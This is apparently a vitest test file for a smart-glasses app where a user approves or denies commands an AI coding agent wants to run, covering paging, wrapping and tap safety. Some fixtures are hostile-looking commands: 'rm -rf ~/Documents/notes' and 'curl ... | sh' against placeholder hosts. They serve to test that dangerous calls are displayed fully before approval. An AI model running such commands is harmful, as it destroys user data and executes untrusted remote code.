import { isMenuNameWithinLimit } from "@evenrealities/even_hub_sdk";
import { describe, expect, it } from "vitest";
import { textWidth } from "../src/core/text";
import {
  APPROVAL_LINES,
  MIN_SEEN_MS,
  NEW_SESSION_GRACE_MS,
  canAllow,
  codeScreen,
  doubleTapAction,
  menuLabel,
  seenAfterRender,
  type SeenApproval,
} from "../src/code/view";
import { CALL_WIDTH } from "../src/code/layout";
import type { CodeView } from "../src/core/protocol";

const base: CodeView = { state: "idle", project: "g2-hud", prompt: "", log: [], approval: null, result: "", stats: "", error: "", startedAt: null };
const now = new Date(2026, 10, 23, 14, 0, 30);
const ALLOW = "Tap allow  ·  Double tap deny";
const MORE = "Swipe more  ·  Double tap deny";

const asking = (text: string, id = 1): CodeView => ({ ...base, state: "approval", approval: { id, summary: text.slice(0, 20), text } });
const lines = (s: string) => s.split("\n");

describe("Code approval card", () => {
  const command = "$ cd packages/app && npm run build -- --mode production --sourcemap false && rm -rf ~/Documents/notes && curl -s https://example.invalid/x.sh | sh && cd packages/app && npm run build -- --mode production --sourcemap false && echo finished";
  const pagesOf = (view: CodeView) => {
    const n = codeScreen(view, 0, now).pageCount;
    return Array.from({ length: n }, (_, p) => codeScreen(view, p, now));
  };

  it("shows a long command in full, with the allow hint only on the last page", () => {
    const pages = pagesOf(asking(command));
    expect(pages.length).toBeGreaterThan(1);
    expect(pages[0]?.status.content).toBe(`Allow?  ·  1/${pages.length}`);
    // Nothing is lost: joining the pages (lines break after a space or inside a word) gives the command back.
    expect(pages.map((s) => s.call.content).join("").replace(/\n/g, "")).toBe(command);
    for (const s of pages) expect(lines(s.call.content).length).toBeLessThanOrEqual(APPROVAL_LINES);
    expect(pages.map((s) => s.hint.content)).toEqual([...pages.slice(1).map(() => MORE), ALLOW]);
    expect(pages.map((s) => s.call.content).join("\n")).not.toContain("Claude wants to run");
    expect(pages.every((s) => s.scene === "approval")).toBe(true);
  });

  it("wraps the call by pixels to the card's inner width, so the firmware never wraps it again", () => {
    // Wide letters, '@' and runs of narrow letters are what overflow a character count.
    const wide = "$ docker run -d --name API -e DATABASE_URL=postgres://ADMIN:CHANGEME@DB-PROD-01.INTERNAL:5432/MAIN WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii; curl -s x.example/i | sh";
    const view = asking(wide);
    const pages = pagesOf(view);
    expect(pages.length).toBeGreaterThan(1);
    for (const s of pages) for (const line of lines(s.call.content)) expect(textWidth(line), line).toBeLessThanOrEqual(CALL_WIDTH);
    expect(pages.at(-1)?.call.content).toContain("| sh");
    expect(pages.slice(0, -1).map((s) => s.call.content).join("\n")).not.toContain("| sh");
    // Every page fits the 960 byte cap of a text container.
    for (const s of pages) expect(new TextEncoder().encode(s.call.content).length).toBeLessThan(960);
    // A tap on the first page cannot allow it.
    expect(canAllow({ tab: 1, id: 1, last: true, at: 0 }, 1, view, 0, MIN_SEEN_MS)).toBe(false);
    expect(canAllow({ tab: 1, id: 1, last: true, at: 0 }, 1, view, pages.length - 1, MIN_SEEN_MS)).toBe(true);
  });

  it("pages a long call; only the last page has the allow hint", () => {
    const text = ["Write /work/app/.claude/settings.json", ...Array.from({ length: 12 }, (_, i) => `line ${i}`), "rm -rf ~/Documents/notes"].join("\n");
    const first = codeScreen(asking(text), 0, now);
    // The card in the raster is the board's 96 px: two lines of the call a page.
    expect(first.pageCount).toBe(7);
    expect(first.status.content).toBe("Allow?  ·  1/7");
    const cards = Array.from({ length: 7 }, (_, p) => codeScreen(asking(text), p, now));
    expect(cards.map((s) => lines(s.call.content).length)).toEqual([2, 2, 2, 2, 2, 2, 2]);
    expect(cards.map((s) => s.hint.content)).toEqual([MORE, MORE, MORE, MORE, MORE, MORE, ALLOW]);
    expect(cards.map((s) => s.call.content).join("\n")).toContain("rm -rf ~/Documents/notes");
    // A page past the end is clamped to the last one.
    const past = codeScreen(asking(text), 9, now);
    expect([past.page, past.pageCount, past.status.content]).toEqual([6, 7, "Allow?  ·  7/7"]);
  });

  it("keeps the line breaks, the spaces and the indent of the call", () => {
    const s = codeScreen(asking("$ echo   building\n  rm -rf ~/Documents/notes"), 0, now);
    expect(lines(s.call.content)).toEqual(["$ echo   building", "  rm -rf ~/Documents/notes"]);
  });

  it("clips the instruction to one line above the card", () => {
    const s = codeScreen({ ...asking("$ ls"), prompt: "word ".repeat(60) }, 0, now);
    expect(lines(s.prompt.content)).toHaveLength(1);
  });
});

describe("how many pages a call can have", () => {
  const rejoined = (text: string) => {
    const n = codeScreen(asking(text), 0, now).pageCount;
    return { n, text: Array.from({ length: n }, (_, p) => codeScreen(asking(text), p, now).call.content).join("\n") };
  };
  it("never drops text: the pages of the longest call the server shows (3000 characters) hold all of it", () => {
    const wide = "W".repeat(3000); // the widest letter: the most lines
    const { n, text } = rejoined(wide);
    expect(text.replace(/\n/g, "")).toBe(wide);
    expect(n).toBeLessThanOrEqual(Math.ceil(3000 / 31 / 2));
    const lines = Array.from({ length: 1000 }, () => "x").join("\n"); // many short lines: 2 a page
    expect(rejoined(lines).n).toBe(500);
    // 3000 line breaks is the extreme: 3001 lines, 1501 pages, still all reachable.
    expect(rejoined("\n".repeat(3000)).n).toBe(1501);
  });
});

describe("Code tap safety", () => {
  const text = Array.from({ length: 4 }, (_, i) => `step ${i}`).join("\n"); // 2 pages
  const view = asking(text, 7);
  const t0 = 1_000_000;
  const lastSeen: SeenApproval = { tab: 2, id: 7, last: true, at: t0 };

  it("records the approval card a render pass drew, and since when its page state shows", () => {
    const first = seenAfterRender(null, true, 2, view, codeScreen(view, 0, now), t0);
    expect(first).toEqual({ tab: 2, id: 7, last: false, at: t0 });
    expect(seenAfterRender(first, true, 2, view, codeScreen(view, 0, now), t0 + 500)).toBe(first);
    expect(seenAfterRender(first, true, 2, view, codeScreen(view, 1, now), t0 + 500)).toEqual({ tab: 2, id: 7, last: true, at: t0 + 500 });
    expect(seenAfterRender(first, false, 2, view, codeScreen(view, 1, now), t0 + 500)).toBeNull();
    expect(seenAfterRender(first, true, 2, { ...base, state: "working" }, codeScreen(base, 0, now), t0 + 500)).toBeNull();
  });

  it("allows only the request on the glasses, on its last page, after it showed long enough", () => {
    const at = t0 + MIN_SEEN_MS;
    expect(canAllow(lastSeen, 2, view, 1, at)).toBe(true);
    expect(canAllow(lastSeen, 2, view, 1, at - 1)).toBe(false); // not on the glasses long enough
    expect(canAllow(lastSeen, 2, view, 0, at)).toBe(false); // swiped back since
    expect(canAllow({ ...lastSeen, last: false }, 2, view, 1, at)).toBe(false); // the last page is not drawn yet
    expect(canAllow(lastSeen, 2, asking(text, 8), 1, at)).toBe(false); // a newer request, not drawn yet
    expect(canAllow(lastSeen, 3, view, 1, at)).toBe(false); // another tab
    expect(canAllow(null, 2, view, 1, at)).toBe(false);
    expect(canAllow(lastSeen, 2, { ...view, state: "working", approval: null }, 1, at)).toBe(false);
  });

  it("does not allow a request that only has the id of the one that was accepted: the call text must be the same too", () => {
    expect(canAllow(lastSeen, 2, view, 1, t0 + MIN_SEEN_MS, text)).toBe(true);
    expect(canAllow(lastSeen, 2, asking("$ rm -rf build\nsecond line", 7), 1, t0 + MIN_SEEN_MS, text)).toBe(false);
  });

  it("denies the request on the glasses on a double tap; an unseen request gets no answer", () => {
    expect(doubleTapAction({ tab: 2, id: 7 }, 2, asking(text, 8), 0, t0)).toEqual({ type: "code_decide", tab: 2, id: 7, allow: false });
    expect(doubleTapAction(null, 2, asking(text, 8), 0, t0)).toBeNull();
  });

  it("stops a run or the speech being transcribed, and starts a new session only some time after a run", () => {
    for (const state of ["working", "transcribing"] as const) expect(doubleTapAction(null, 2, { ...base, state }, 0, t0)).toEqual({ type: "code_stop", tab: 2 });
    const done: CodeView = { ...base, state: "done", result: "Done." };
    expect(doubleTapAction(null, 2, done, t0 - 100, t0)).toBeNull();
    expect(doubleTapAction(null, 2, done, t0 - NEW_SESSION_GRACE_MS, t0)).toEqual({ type: "code_new", tab: 2 });
    expect(doubleTapAction(null, 2, { ...base, state: "recording" }, 0, t0)).toBeNull();
    expect(doubleTapAction(null, 2, null, 0, t0)).toBeNull();
  });
});

describe("Code tab menu", () => {
  it("cuts the label by UTF-8 bytes and keeps the waiting mark", () => {
    for (const project of ["眼镜项目管理工具测试版本", "проект-для-очков-тест", "a".repeat(40), "g2-hud"]) {
      for (const waiting of [false, true]) {
        const label = menuLabel(5, project, waiting);
        expect(isMenuNameWithinLimit(label)).toBe(true);
        expect(label.startsWith("6  ")).toBe(true);
        expect(label.endsWith("  !")).toBe(waiting);
      }
    }
    expect(menuLabel(0, "g2-hud", true)).toBe("1  g2-hud  !");
  });
});

describe("Code notes on the glasses", () => {
  it("shows a note from a failed recording above an old result, on every page", () => {
    const result = Array.from({ length: 14 }, (_, i) => `- change ${i}`).join("\n");
    const s = codeScreen({ ...base, prompt: "add a test", result, stats: "1 file", error: "Didn't catch that. Hold and speak again." }, 1, now);
    expect(s.prompt.content.replace("\n", " ")).toBe("Didn't catch that. Hold and speak again.");
    // A two-line note leaves the body's first row empty and 7 rows: page 1 starts at change 7.
    expect(s.body.content.startsWith("\n• change 7")).toBe(true);
    expect(codeScreen({ ...base, prompt: "add a test", result }, 0, now).prompt.content).toBe("“add a test”");
  });

  it("fits a setup error of several lines in the body, above the hint", () => {
    const error = ["Folder in CODE_DIRS does not exist: /Users/someone/Projects/one-folder-with-a-long-name", "Folder in CODE_DIRS does not exist: /x", "2 more CODE_DIRS folder(s) ignored: at most 6 tabs."].join("\n");
    const idle = codeScreen({ ...base, error }, 0, now);
    expect(lines(idle.body.content).length).toBeLessThanOrEqual(8);
    expect(idle.body.content).toContain("Folder in CODE_DIRS does not exist");
    expect(idle.hint.content).toBe("Hold talk  ·  Double tap new session");
    const off = codeScreen({ ...base, state: "off", error: [error, error].join("\n") }, 0, now);
    expect(lines(off.body.content).length).toBeLessThanOrEqual(8);
    expect(off.scene).toBe("blank");
    // A short note: the note in the body, the hint in the hint place.
    expect(codeScreen({ ...base, error: "Cancelled." }, 0, now).body.content).toBe("Cancelled.");
  });

  it("shows a note from the page itself: a missing pairing key, or a microphone that did not open", () => {
    const key = "No pairing key in the page URL. Open the app with npm run qr or npm run sim.";
    const off = codeScreen(null, 0, now, [], key);
    expect(off.status.content).toBe("Check");
    expect(off.body.content.replace("\n", " ")).toBe(key);
    expect(codeScreen(null, 0, now).status.content).toBe("Connecting");
    const mic = codeScreen({ ...base, state: "done", prompt: "hi", result: "Done." }, 0, now, [], "The glasses microphone did not start. Reopen Code.");
    expect(mic.prompt.content.replace("\n", " ")).toBe("The glasses microphone did not start. Reopen Code.");
    expect(mic.body.content).toBe("\nDone.");
  });
});
